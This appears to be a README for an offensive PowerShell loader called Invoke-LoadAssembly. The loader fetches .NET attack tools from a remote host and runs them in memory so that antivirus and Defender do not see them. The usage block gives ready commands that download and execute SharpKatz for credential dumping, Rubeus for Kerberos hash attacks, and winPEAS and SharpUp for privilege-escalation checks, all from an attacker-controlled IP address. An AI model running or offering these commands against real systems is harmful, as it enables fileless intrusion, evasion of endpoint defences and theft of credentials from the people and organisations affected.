# PowerShell exec-assembly remote loader

## This is used to load sharp assembly tools remotely from PowerShell direcly in memory (fileless) for a better AV bypass (need AMSI bypass first)

Usage:

```
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpKatz.exe -Command "msv"

Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/winPEAS.exe -Command "notcolor quiet log"

Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/Rubeus.exe -Command "hash /password:test"

# After fix the reflectedType is not public issue (Defender not detected):
Invoke-LoadAssembly -AssemblyUrl http://10.10.10.128:81/SharpUpNew.exe -Command "audit"

```